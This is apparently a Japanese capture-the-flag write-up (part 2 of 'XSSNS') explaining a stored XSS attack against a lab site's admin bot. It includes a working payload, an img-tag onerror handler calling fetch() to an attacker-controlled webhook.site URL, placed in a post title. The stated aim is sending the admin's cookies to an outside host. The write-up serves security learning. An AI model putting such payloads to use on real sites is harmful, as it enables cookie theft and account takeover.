# XSSNS Pt.2

## / Overview

Stored XSS

## / Writeup

[XSSNS Pt.1](../XSSNS%20Pt.1/)の続きです。

目標は`Report Admin`に指定したサイトにadminがアクセスすることで、外部にクッキー情報を持ち出すことです。

### URL作成
まずは[webhook.site](https://webhook.site)で自分のURLを作ります。ここにadminがアクセスすると、フラグが見れるはずです。

### ペイロードを投稿

adminにこのwebhookサイトのアドレスを直接指定したいのですが、adminは`/xss/`から始まるサイトにしかアクセスしません。

`/xss/`で始まるページで悪用できるページは、マイページである`/xss/user/pqZW23xtdTVJ`です。

ここで Stored XSS というテクニックを使います。次のような流れでadminを誘導します。

1. マイページの `Psot title` に `webhook.site` にリダイレクトする様なscriptタグを埋め込む
2. このページをクロールしたadminは `webhook.site` にリダイレクトさせられる。

これを実現するscriptタグとして有名なものに
```html
<img src="x" onerror="fetch('<webhookのURL>')"/>
```

があります。これを`Post title`に入力して投稿します。

### adminに報告

この状態で`Report Admin`に`/xss/user/pqZW23xtdTVJ` (マイページのURL) を入力すると、`webhook`に接続ログが来ます。`user-agent`がフラグになっています。